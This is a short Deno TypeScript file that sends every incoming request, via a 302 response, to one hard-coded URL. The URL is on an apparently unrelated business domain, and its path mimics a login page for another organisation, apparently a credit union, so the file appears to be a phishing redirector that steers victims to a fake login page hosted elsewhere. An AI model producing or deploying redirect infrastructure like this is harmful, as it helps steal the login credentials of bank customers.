// redirect.ts

const redirectUrl = "https://samolinerecruitmentagency.com/tk/seccu.org/login/";

Deno.serve(() =>
  new Response(null, {
    status: 302,
    headers: {
      Location: redirectUrl,
    },
  })
);
